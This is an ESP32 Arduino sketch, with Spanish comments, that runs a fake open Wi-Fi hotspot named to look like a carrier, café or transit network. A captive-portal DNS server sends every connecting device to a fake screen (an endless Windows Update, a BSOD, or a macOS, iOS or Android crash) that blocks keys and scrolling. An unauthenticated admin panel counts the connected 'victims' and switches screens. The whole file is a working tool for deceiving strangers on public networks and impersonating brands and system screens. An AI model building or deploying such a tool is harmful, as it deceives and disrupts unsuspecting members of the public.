/*
 * 💀 FAKE WINDOWS UPDATE - ESP32
 * 
 * Crea un WiFi abierto que cuando alguien se conecta
 * le muestra una pantalla de "Actualizando Windows..."
 * que NUNCA termina 😈
 * 
 * Funciona con tu ESP32-WROOM (HW-394)
 * NO necesitas comprar nada adicional
 */

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>

// ==================== CONFIGURACIÓN ====================
// Cambia el nombre del WiFi para hacerlo más creíble
const char* ssid = "WiFi_Gratis_ClaroChile";  // Nombre tentador
// const char* ssid = "Starbucks_WiFi_Free";
// const char* ssid = "Metro_Santiago_Free";
// const char* ssid = "Mall_Plaza_Guest";

const byte DNS_PORT = 53;

DNSServer dnsServer;
WebServer server(80);

// Contador de víctimas
int victimCount = 0;
unsigned long startTime = 0;

// ==================== PÁGINAS HTML ====================

// Página principal - Windows Update
const char* windowsUpdatePage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Windows Update</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      background: #0078d4;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      overflow: hidden;
      cursor: none;
      user-select: none;
    }
    
    .container {
      text-align: center;
      padding: 20px;
    }
    
    /* Círculo de carga estilo Windows */
    .loader {
      width: 100px;
      height: 100px;
      margin: 0 auto 50px;
      position: relative;
    }
    
    .loader::before {
      content: '';
      position: absolute;
      width: 100%;
      height: 100%;
      border: 4px solid transparent;
      border-top-color: white;
      border-radius: 50%;
      animation: spin 1.5s linear infinite;
    }
    
    .loader::after {
      content: '';
      position: absolute;
      width: 70%;
      height: 70%;
      top: 15%;
      left: 15%;
      border: 4px solid transparent;
      border-top-color: rgba(255,255,255,0.5);
      border-radius: 50%;
      animation: spin 1s linear infinite reverse;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .title {
      font-size: 2em;
      font-weight: 300;
      margin-bottom: 20px;
    }
    
    .subtitle {
      font-size: 1.2em;
      font-weight: 300;
      opacity: 0.9;
      margin-bottom: 10px;
    }
    
    .percent {
      font-size: 4em;
      font-weight: 200;
      margin: 30px 0;
    }
    
    .warning {
      font-size: 0.9em;
      opacity: 0.8;
      margin-top: 40px;
    }
    
    /* Puntos animados */
    .dots::after {
      content: '';
      animation: dots 1.5s steps(4, end) infinite;
    }
    
    @keyframes dots {
      0% { content: ''; }
      25% { content: '.'; }
      50% { content: '..'; }
      75% { content: '...'; }
      100% { content: ''; }
    }
    
    /* Bloquear interacción */
    .blocker {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 9999;
    }
    
    /* Logo Windows simplificado */
    .windows-logo {
      width: 60px;
      height: 60px;
      margin-bottom: 40px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 4px;
    }
    
    .windows-logo div {
      background: white;
    }
  </style>
</head>
<body>
  <div class="blocker"></div>
  
  <div class="container">
    <div class="windows-logo">
      <div></div>
      <div></div>
      <div></div>
      <div></div>
    </div>
    
    <div class="loader"></div>
    
    <div class="title">Trabajando en las actualizaciones</div>
    
    <div class="percent" id="percent">0%</div>
    
    <div class="subtitle">
      <span class="dots">No apagues el equipo. Esto puede tardar un rato</span>
    </div>
    
    <div class="warning">
      Tu PC se reiniciará varias veces. Ve a prepararte un café ☕
    </div>
  </div>
  
  <script>
    // Progreso falso que nunca llega a 100%
    let progress = 0;
    let speed = 1;
    let stuckAt = Math.floor(Math.random() * 30) + 25; // Se "traba" entre 25-55%
    let isStuck = false;
    let stuckTime = 0;
    
    function updateProgress() {
      const percentEl = document.getElementById('percent');
      
      if (progress >= stuckAt && !isStuck) {
        isStuck = true;
        stuckTime = Date.now();
      }
      
      if (isStuck) {
        // Quedarse trabado por un rato
        if (Date.now() - stuckTime > 15000) { // 15 segundos
          isStuck = false;
          stuckAt = progress + Math.floor(Math.random() * 15) + 10;
          if (stuckAt > 95) stuckAt = 95; // Nunca pasa de 95%
        }
        // Pequeña variación mientras está "trabado"
        const variation = Math.random() > 0.5 ? 0 : (Math.random() > 0.5 ? 1 : -1);
        percentEl.textContent = Math.max(0, progress + variation) + '%';
      } else {
        // Avance lento y errático
        if (progress < 95) {
          const increment = Math.random() * 0.5;
          progress += increment;
          if (progress > 99) progress = 94; // Reset si casi llega
        }
        percentEl.textContent = Math.floor(progress) + '%';
      }
    }
    
    // Actualizar cada 500ms
    setInterval(updateProgress, 500);
    
    // Bloquear todas las teclas
    document.addEventListener('keydown', function(e) {
      e.preventDefault();
      return false;
    });
    
    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
      e.preventDefault();
      return false;
    });
    
    // Intentar fullscreen (no siempre funciona en móviles)
    document.addEventListener('click', function() {
      if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen().catch(() => {});
      }
    });
    
    // Prevenir scroll
    document.body.addEventListener('touchmove', function(e) {
      e.preventDefault();
    }, { passive: false });
    
    // Reportar víctima al servidor
    fetch('/victim');
  </script>
</body>
</html>
)rawliteral";



// Página alternativa - BSOD (Pantalla Azul de la Muerte)
const char* bsodPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>:(</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      background: #0078d7;
      min-height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      padding: 10%;
      overflow: hidden;
      cursor: none;
      user-select: none;
    }
    
    .sad { font-size: 8em; margin-bottom: 30px; }
    
    .title {
      font-size: 1.8em;
      margin-bottom: 20px;
      line-height: 1.4;
    }
    
    .info {
      font-size: 0.9em;
      line-height: 1.6;
      margin-bottom: 30px;
      opacity: 0.9;
    }
    
    .percent-container {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-top: 40px;
    }
    
    .percent {
      font-size: 1em;
    }
    
    .qr {
      width: 80px;
      height: 80px;
      background: white;
      margin-top: 30px;
      padding: 5px;
    }
    
    .qr-inner {
      width: 100%;
      height: 100%;
      background: repeating-linear-gradient(
        90deg,
        black 0px, black 4px,
        white 4px, white 8px
      );
    }
    
    .stop-code {
      margin-top: 20px;
      font-size: 0.8em;
      opacity: 0.7;
    }
    
    .blocker {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div class="blocker"></div>
  
  <div class="sad">:(</div>
  
  <div class="title">
    Tu dispositivo tuvo un problema y necesita reiniciarse.
    Estamos recopilando información del error y luego reiniciaremos.
  </div>
  
  <div class="percent-container">
    <span class="percent" id="percent">0% completado</span>
  </div>
  
  <div class="info">
    Si deseas saber más, busca en línea este error: DRIVER_IRQL_NOT_LESS_OR_EQUAL (WIFI_KARMA.sys)
  </div>
  
  <div class="qr"><div class="qr-inner"></div></div>
  
  <div class="stop-code">
    Stop code: CRITICAL_PROCESS_DIED<br>
    Error: 0x000000EF (0x0000000000000000, 0xFFFFE38B3A2F9080)
  </div>
  
  <script>
    let progress = 0;
    
    function updateProgress() {
      if (progress < 99) {
        progress += Math.random() * 0.3;
        if (progress > 35 && progress < 37) progress = 35; // Se traba en 35%
        if (progress > 78 && progress < 82) progress = 78; // Se traba en 78%
        if (progress > 99) progress = 98;
      }
      document.getElementById('percent').textContent = Math.floor(progress) + '% completado';
    }
    
    setInterval(updateProgress, 800);
    
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.body.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
    
    fetch('/victim');
  </script>
</body>
</html>
)rawliteral";



// Página alternativa - macOS Kernel Panic
const char* macPanicPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kernel Panic</title>
  <style>
    * { margin: 0; padding: 0; }
    body {
      background: #1a1a1a;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      overflow: hidden;
      user-select: none;
    }
    .container {
      text-align: center;
      color: white;
      padding: 40px;
    }
    .icon {
      font-size: 4em;
      margin-bottom: 30px;
    }
    .title {
      font-size: 1.5em;
      margin-bottom: 15px;
      font-weight: 500;
    }
    .subtitle {
      font-size: 1em;
      opacity: 0.8;
      line-height: 1.6;
    }
    .lang {
      margin-top: 30px;
      font-size: 0.9em;
      opacity: 0.6;
    }
    .blocker {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div class="blocker"></div>
  <div class="container">
    <div class="icon">⚠️</div>
    <div class="title">You need to restart your computer.</div>
    <div class="subtitle">
      Hold down the Power button for several seconds or press the Restart button.
    </div>
    <div class="lang">
      Necesitas reiniciar tu ordenador. Mantén presionado el botón de encendido durante varios segundos.
    </div>
  </div>
  <script>
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
    fetch('/victim');
  </script>
</body>
</html>
)rawliteral";

// Página de Admin - Ver estadísticas (acceso secreto)
const char* adminPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      min-height: 100vh;
      font-family: 'Segoe UI', sans-serif;
      color: white;
      padding: 20px;
    }
    .container { max-width: 500px; margin: 0 auto; }
    h1 { text-align: center; margin-bottom: 30px; }
    .card {
      background: rgba(255,255,255,0.1);
      border-radius: 15px;
      padding: 20px;
      margin-bottom: 20px;
    }
    .stat {
      display: flex;
      justify-content: space-between;
      padding: 10px 0;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }
    .stat:last-child { border: none; }
    .big-number {
      font-size: 3em;
      text-align: center;
      color: #e74c3c;
      margin: 20px 0;
    }
    .btn {
      display: block;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      font-size: 1em;
      cursor: pointer;
      margin-bottom: 10px;
      color: white;
    }
    .btn-blue { background: #3498db; }
    .btn-red { background: #e74c3c; }
    .btn-green { background: #27ae60; }
    .btn-purple { background: #9b59b6; }
    .btn-orange { background: #e67e22; }
  </style>
</head>
<body>
  <div class="container">
    <h1>💀 Panel de Control</h1>
    
    <div class="card">
      <h3>📊 Estadísticas</h3>
      <div class="big-number" id="victims">0</div>
      <p style="text-align:center;opacity:0.7;">Víctimas atrapadas</p>
      <div class="stat">
        <span>Tiempo activo:</span>
        <span id="uptime">0 min</span>
      </div>
      <div class="stat">
        <span>WiFi SSID:</span>
        <span id="ssid">-</span>
      </div>
    </div>
    
    <div class="card">
      <h3>🎭 Cambiar Pantalla</h3>
      <button class="btn btn-blue" onclick="setMode('update')">
        💻 Windows Update
      </button>
      <button class="btn btn-red" onclick="setMode('bsod')">
        💀 Pantalla Azul (BSOD)
      </button>
      <button class="btn btn-purple" onclick="setMode('mac')">
        🍎 Mac Kernel Panic
      </button>
      <button class="btn btn-orange" onclick="setMode('ios')">
        📱 iOS Crash
      </button>
      <button class="btn btn-green" onclick="setMode('android')">
        🤖 Android Crash
      </button>
    </div>
    
    <div class="card">
      <h3>⚙️ Configuración WiFi</h3>
      <input type="text" id="newSSID" placeholder="Nuevo nombre de WiFi" 
             style="width:100%;padding:10px;border-radius:5px;border:none;margin-bottom:10px;">
      <button class="btn btn-green" onclick="changeSSID()">
        📶 Cambiar SSID
      </button>
    </div>
  </div>
  
  <script>
    function loadStats() {
      fetch('/stats')
        .then(r => r.json())
        .then(data => {
          document.getElementById('victims').textContent = data.victims;
          document.getElementById('uptime').textContent = data.uptime + ' min';
          document.getElementById('ssid').textContent = data.ssid;
        });
    }
    
    function setMode(mode) {
      fetch('/setmode?m=' + mode)
        .then(r => r.text())
        .then(t => alert('Modo cambiado: ' + mode));
    }
    
    function changeSSID() {
      const ssid = document.getElementById('newSSID').value;
      if (ssid) {
        fetch('/setssid?s=' + encodeURIComponent(ssid))
          .then(r => r.text())
          .then(t => alert('SSID cambiado. Reinicia el ESP32.'));
      }
    }
    
    loadStats();
    setInterval(loadStats, 5000);
  </script>
</body>
</html>
)rawliteral";



// Página iOS Crash
const char* iosCrashPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iPhone</title>
  <style>
    * { margin: 0; padding: 0; }
    body {
      background: black;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      color: white;
      user-select: none;
    }
    .apple-logo {
      font-size: 5em;
      margin-bottom: 50px;
      animation: pulse 2s ease-in-out infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .progress-bar {
      width: 200px;
      height: 4px;
      background: #333;
      border-radius: 2px;
      overflow: hidden;
    }
    .progress-fill {
      height: 100%;
      background: white;
      width: 0%;
      animation: load 30s ease-out forwards;
    }
    @keyframes load {
      0% { width: 0%; }
      30% { width: 28%; }
      60% { width: 55%; }
      80% { width: 75%; }
      95% { width: 89%; }
      100% { width: 92%; }
    }
    .blocker {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div class="blocker"></div>
  <div class="apple-logo"></div>
  <div class="progress-bar">
    <div class="progress-fill"></div>
  </div>
  <script>
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.body.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
    fetch('/victim');
  </script>
</body>
</html>
)rawliteral";

// Página Android Crash
const char* androidCrashPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Android</title>
  <style>
    * { margin: 0; padding: 0; }
    body {
      background: #1a1a1a;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: 'Roboto', sans-serif;
      color: white;
      user-select: none;
    }
    .android {
      font-size: 6em;
      margin-bottom: 30px;
      animation: dead 3s ease-in-out infinite;
    }
    @keyframes dead {
      0%, 100% { transform: rotate(0deg); }
      25% { transform: rotate(-5deg); }
      75% { transform: rotate(5deg); }
    }
    .title {
      font-size: 1.3em;
      color: #f44336;
      margin-bottom: 20px;
    }
    .cmd {
      font-family: monospace;
      font-size: 0.7em;
      color: #888;
      text-align: center;
      line-height: 1.8;
      padding: 0 20px;
    }
    .blink {
      animation: blink 1s step-end infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }
    .blocker {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <div class="blocker"></div>
  <div class="android">🤖</div>
  <div class="title">Android System Recovery</div>
  <div class="cmd">
    E: failed to mount /cache (Invalid argument)<br>
    E: Can't mount /cache/recovery/log<br>
    E: Can't open /cache/recovery/log<br>
    E: failed to mount /data (Invalid argument)<br>
    E: failed to mount /system (Invalid argument)<br><br>
    Rebooting in <span id="countdown">30</span> seconds<span class="blink">_</span>
  </div>
  <script>
    let count = 30;
    setInterval(() => {
      count--;
      if (count <= 0) count = 30; // Reset, nunca reinicia
      document.getElementById('countdown').textContent = count;
    }, 1000);
    
    document.addEventListener('keydown', e => e.preventDefault());
    document.addEventListener('contextmenu', e => e.preventDefault());
    fetch('/victim');
  </script>
</body>
</html>
)rawliteral";



// ==================== VARIABLES GLOBALES ====================
String currentMode = "update";  // update, bsod, mac, ios, android
String currentSSID = "WiFi_Gratis_ClaroChile";

// ==================== HANDLERS ====================

// Redirigir todas las peticiones DNS al ESP32 (Captive Portal)
class CaptiveRequestHandler : public RequestHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(HTTPMethod method, String uri) override {
    return true;
  }

  bool handle(WebServer &server, HTTPMethod method, String uri) override {
    // Si es la página de admin secreta
    if (uri == "/admin" || uri == "/hackerman") {
      server.send(200, "text/html", adminPage);
      return true;
    }
    
    // Si es petición de stats
    if (uri == "/stats") {
      unsigned long uptimeMin = (millis() - startTime) / 60000;
      String json = "{\"victims\":" + String(victimCount) + 
                    ",\"uptime\":" + String(uptimeMin) +
                    ",\"ssid\":\"" + currentSSID + "\"}";
      server.send(200, "application/json", json);
      return true;
    }
    
    // Cambiar modo
    if (uri.startsWith("/setmode")) {
      if (server.hasArg("m")) {
        currentMode = server.arg("m");
        Serial.printf("🎭 Modo cambiado a: %s\n", currentMode.c_str());
      }
      server.send(200, "text/plain", "OK");
      return true;
    }
    
    // Contador de víctimas
    if (uri == "/victim") {
      victimCount++;
      Serial.printf("💀 ¡Nueva víctima! Total: %d\n", victimCount);
      server.send(200, "text/plain", "OK");
      return true;
    }
    
    // Servir la página según el modo actual
    const char* page;
    if (currentMode == "bsod") {
      page = bsodPage;
    } else if (currentMode == "mac") {
      page = macPanicPage;
    } else if (currentMode == "ios") {
      page = iosCrashPage;
    } else if (currentMode == "android") {
      page = androidCrashPage;
    } else {
      page = windowsUpdatePage;
    }
    
    server.send(200, "text/html", page);
    return true;
  }
};

// ==================== SETUP ====================
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n");
  Serial.println("╔═══════════════════════════════════════════════════╗");
  Serial.println("║     💀 FAKE UPDATE TROLL - ESP32 💀               ║");
  Serial.println("║                                                   ║");
  Serial.println("║  Pantallas disponibles:                           ║");
  Serial.println("║  • Windows Update (nunca termina)                 ║");
  Serial.println("║  • Blue Screen of Death (BSOD)                    ║");
  Serial.println("║  • macOS Kernel Panic                             ║");
  Serial.println("║  • iOS Boot Loop                                  ║");
  Serial.println("║  • Android Recovery Error                         ║");
  Serial.println("╚═══════════════════════════════════════════════════╝\n");
  
  startTime = millis();
  
  // Crear Access Point
  WiFi.softAP(currentSSID.c_str());
  Serial.printf("📶 WiFi creado: %s\n", currentSSID.c_str());
  Serial.printf("📱 IP: %s\n", WiFi.softAPIP().toString().c_str());
  
  // Iniciar servidor DNS (redirige todo al ESP32)
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
  Serial.println("🌐 DNS Server iniciado (Captive Portal)");
  
  // Configurar servidor web con handler para captive portal
  server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
  server.begin();
  
  Serial.println("\n✅ ¡SISTEMA LISTO!");
  Serial.println("═══════════════════════════════════════════════════════");
  Serial.println("📱 Las víctimas verán la pantalla de update al conectarse");
  Serial.println("🔧 Panel admin: http://192.168.4.1/admin");
  Serial.println("═══════════════════════════════════════════════════════\n");
}

// ==================== LOOP ====================
void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  
  // Mostrar estadísticas cada 30 segundos
  static unsigned long lastPrint = 0;
  if (millis() - lastPrint > 30000) {
    Serial.printf("📊 Estadísticas - Víctimas: %d | Modo: %s | Uptime: %lu min\n", 
                  victimCount, currentMode.c_str(), (millis() - startTime) / 60000);
    lastPrint = millis();
  }
}
